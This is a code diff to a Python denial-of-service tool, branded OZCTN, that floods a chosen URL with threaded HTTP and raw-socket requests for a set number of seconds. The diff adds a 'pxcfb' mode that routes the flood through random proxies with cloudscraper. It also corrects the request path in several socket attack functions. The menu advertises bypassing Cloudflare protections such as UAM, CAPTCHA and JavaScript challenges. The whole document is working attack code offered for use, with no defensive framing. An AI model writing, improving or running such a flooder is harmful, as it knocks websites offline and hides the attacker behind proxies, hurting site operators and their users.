@@ -1,6 +1,3 @@
-#########################################################################################################################################
-## pip install cloudscraper && pip install socks && pip install pysocks && pip install colorama && pip install undetected_chromedriver ##
-#########################################################################################################################################
 # -*- coding: utf-8 -*-
 from os import system, name
 import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random
@@ -16,10 +13,10 @@ def countdown(t):
     while True:
         if (until - datetime.datetime.now()).total_seconds() > 0:
             stdout.flush()
-            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + "sec left ")
+            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left  ")
         else:
             stdout.flush()
-            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                 \n")
+            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
             return
 
 def get_proxies():
@@ -81,6 +78,8 @@ def AttackPXRAW(url, until_datetime):
 def LaunchPXSOC(url, th, t):
     target = {}
     target['uri'] = urlparse(url).path
+    if target['uri'] == "":
+        target['uri'] = "/"
     target['host'] = urlparse(url).netloc
     target['scheme'] = urlparse(url).scheme
     if ":" in urlparse(url).netloc:
@@ -90,7 +89,7 @@ def LaunchPXSOC(url, th, t):
         pass
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     threads_count = 0
-    req =  "GET / HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
+    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
     req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
     req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
     req += "Connection: Keep-Alive\r\n\r\n"
@@ -135,6 +134,8 @@ def AttackPXSOC(target, until_datetime, req):
 def LaunchSOC(url, th, t):
     target = {}
     target['uri'] = urlparse(url).path
+    if target['uri'] == "":
+        target['uri'] = "/"
     target['host'] = urlparse(url).netloc
     target['scheme'] = urlparse(url).scheme
     if ":" in urlparse(url).netloc:
@@ -144,7 +145,7 @@ def LaunchSOC(url, th, t):
         pass
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     threads_count = 0
-    req =  "GET / HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
+    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
     req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
     req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
     req += "Connection: Keep-Alive\r\n\r\n"
@@ -197,6 +198,33 @@ def AttackCFB(url, until_datetime, scraper):
         try:
             scraper.get(url, timeout=15)
             scraper.get(url, timeout=15)
+        except:
+            pass
+#endregion
+
+#region PXCFB
+def LaunchPXCFB(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    threads_count = 0
+    scraper = cloudscraper.create_scraper()
+    while threads_count <= int(th):
+        try:
+            thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
+            thd.start()
+            threads_count += 1
+        except:
+            pass
+
+def AttackPXCFB(url, until_datetime, scraper):
+    proxy = 'http://'+str(random.choice(list(proxies)))
+    proxy = {
+        'http': proxy,   
+        'https': proxy,
+    }
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            scraper.get(url, proxies=proxy)
+            scraper.get(url, proxies=proxy)
         except:
             pass
 #endregion
@@ -322,6 +350,8 @@ def LaunchCFSOC(url, th, t):
 
     target = {}
     target['uri'] = urlparse(url).path
+    if target['uri'] == "":
+        target['uri'] = "/"
     target['host'] = urlparse(url).netloc
     target['scheme'] = urlparse(url).scheme
     if ":" in urlparse(url).netloc:
@@ -330,7 +360,7 @@ def LaunchCFSOC(url, th, t):
         target['port'] = "443" if urlparse(url).scheme == "https" else "80"
         pass
 
-    req =  'GET / HTTP/1.1\r\n'
+    req =  'GET '+target['uri']+' HTTP/1.1\r\n'
     req += 'Host: ' + target['host'] + '\r\n'
     req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
     req += 'Accept-Encoding: gzip, deflate, br\r\n'
@@ -388,9 +418,9 @@ def title():
     stdout.write("                                "+Fore.RED            +"╚═╝╚═╝╚═╝ ╩ ╝╚╝                \n")
     stdout.write("             "+Fore.RED            +"        ══╦═════════════════════════════════╦══\n")
     stdout.write("             \x1b[38;2;255;0;0m╔═════════╩═════════════════════════════════╩═════════╗\n")
-    stdout.write("             \x1b[38;2;255;0;0m║ \x1b[38;2;0;255;189m        Welcome To The Main Screen Of OZCTN\x1b[38;2;255;0;0m           ║\n")
-    stdout.write("             \x1b[38;2;255;0;0m║ \x1b[38;2;0;255;189m          Type [help,?] To See The Commands    \x1b[38;2;255;0;0m       ║\n")
-    stdout.write("             \x1b[38;2;255;0;0m║ \x1b[38;2;0;255;189m         Contact Dev - Instagram : OZCTN   \x1b[38;2;255;0;0m           ║\n")
+    stdout.write("             \x1b[38;2;255;0;0m║ \x1b[38;2;0;255;189m        Welcome To The Main Screen Of OZCTN\x1b[38;2;255;0;0m          ║\n")
+    stdout.write("             \x1b[38;2;255;0;0m║ \x1b[38;2;0;255;189m          Type [help,?] To See The Commands    \x1b[38;2;255;0;0m      ║\n")
+    stdout.write("             \x1b[38;2;255;0;0m║ \x1b[38;2;0;255;189m         Contact Dev - Instagram : OZCTN   \x1b[38;2;255;0;0m          ║\n")
     stdout.write("             \x1b[38;2;255;0;0m╚═════════════════════════════════════════════════════╝\n")
     stdout.write("                                                                                          \n")
 
@@ -424,6 +454,18 @@ def command():
         timer.start()
         LaunchCFB(target, thread, t)
         timer.join()
+    elif command == "pxcfb":
+        if get_proxies():
+            stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
+            target = input()
+            stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
+            thread = input()
+            stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
+            t = input()
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            LaunchPXCFB(target, thread, t)
+            timer.join()
     elif command == "raw":
         stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
         target = input()
@@ -501,8 +543,8 @@ def command():
 
 def func():
     stdout.write(Fore.RED+" ["+Fore.WHITE+"LAYER 7"+Fore.RED+"]\n")
-    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfb        "+Fore.RED+": "+Fore.WHITE+"Bypass Normal CF (nosec)\n")
-    #stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"uam        "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfb        "+Fore.RED+": "+Fore.WHITE+"Bypass CF attack\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxcfb      "+Fore.RED+": "+Fore.WHITE+"Bypass CF attack with proxy\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfpro      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfsoc      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"raw        "+Fore.RED+": "+Fore.WHITE+"Request attack\n")
@@ -510,9 +552,9 @@ def func():
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxraw      "+Fore.RED+": "+Fore.WHITE+"Proxy Request attack\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxsoc      "+Fore.RED+": "+Fore.WHITE+"Proxy Socket attack\n")
     
-    stdout.write(Fore.RED+" \n["+Fore.WHITE+"LAYER 4"+Fore.RED+"]\n")
-    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"tcp        "+Fore.RED+": "+Fore.WHITE+"Strong TCP attack (not supported)\n")
-    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"udp        "+Fore.RED+": "+Fore.WHITE+"Strong UDP attack (not supported)\n")
+    #stdout.write(Fore.RED+" \n["+Fore.WHITE+"LAYER 4"+Fore.RED+"]\n")
+    #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"tcp        "+Fore.RED+": "+Fore.WHITE+"Strong TCP attack (not supported)\n")
+    #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"udp        "+Fore.RED+": "+Fore.WHITE+"Strong UDP attack (not supported)\n")
     
     stdout.write(Fore.RED+" \n["+Fore.WHITE+"ETC.."+Fore.RED+"]\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"clear/cls  "+Fore.RED+": "+Fore.WHITE+"Clear console\n")
